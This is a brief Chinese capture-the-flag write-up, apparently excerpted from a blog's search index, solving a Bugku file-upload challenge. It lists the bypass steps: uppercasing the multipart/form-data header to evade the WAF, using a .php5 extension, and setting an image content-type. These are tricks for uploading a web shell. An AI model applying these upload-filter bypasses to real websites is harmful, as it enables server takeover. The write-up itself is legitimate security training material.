<h2 id="求getshell"><a class="header-anchor" href="#求getshell">¶</a>求getshell</h2>
<p>打开页面是一道文件上传题<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%B1%82getshell/YFQ0%40IG%40U%40S2_BJ0%7DD3TAH6.png" alt=""><br>
试过了很多种方法，做成图片马上传，改后缀，改content-type类型都是失败，也试了php的一些绕过姿势.php|.php5|.php4|.php3|.php2|.php1|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1等等</p>
<p>后面找了资料发现上面还有个content-type头，multipart/form-data大写能绕过waf的严格检测，所以去试了一波<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%B1%82getshell/AD%28GHI7ZH1OLA%24%5DS_LC8880.png" alt=""></p>
<p>总结：</p>
<p>1.第一个content-type头大写绕过waf检测<br>
2.上传文件的后缀名改成php5绕过后缀检测<br>
3.上传的content-type头得是image类型满足图片的要求</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
